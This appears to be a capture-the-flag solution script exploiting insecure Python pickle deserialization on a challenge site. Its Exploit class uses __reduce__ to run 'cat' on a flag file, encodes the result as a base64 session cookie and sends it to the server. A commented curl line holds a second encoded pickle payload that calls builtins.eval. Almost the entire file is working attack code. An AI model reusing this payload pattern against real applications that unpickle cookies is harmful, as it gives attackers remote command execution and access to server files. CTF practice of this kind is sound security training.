import pickle
import base64
import os
import requests
import subprocess

def read(cmd):
    return subprocess.check_output(cmd).decode()

class Exploit:
    def __reduce__(self):
        cmd = ['cat', '/flag_5fb2acebf1d0c558']

        return (subprocess.check_output, (cmd, ))

# Create a payload
payload = pickle.dumps({"name" : Exploit(), "age": 18})

# Base64 encode the payload
encoded_payload = base64.b64encode(payload).decode()

# user = pickle.loads(base64.b64decode(encoded_payload))
# print("user", user)
# print(encoded_payload)

resp = requests.get("https://pickle.ctfd.nckuctf.org/", cookies={"session": encoded_payload})
print(resp.text)

# curl --location 'https://pickle.ctfd.nckuctf.org/' \
# --header 'Cookie: session=gASVxwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIyreyduYW1lJzogJy5cbi4uXG4uVm9sdW1lSWNvbi5pY25zXG4uZmlsZVxuLnZvbFxuQXBwbGljYXRpb25zXG5MaWJyYXJ5XG5TeXN0ZW1cblVzZXJzXG5Wb2x1bWVzXG5iaW5cbmNvcmVzXG5kZXZcbmV0Y1xuaG9tZVxub3B0XG5wcml2YXRlXG5zYmluXG50bXBcbnVzclxudmFyXG4nLCAnYWdlJzogMTh9lIWUUpQu'

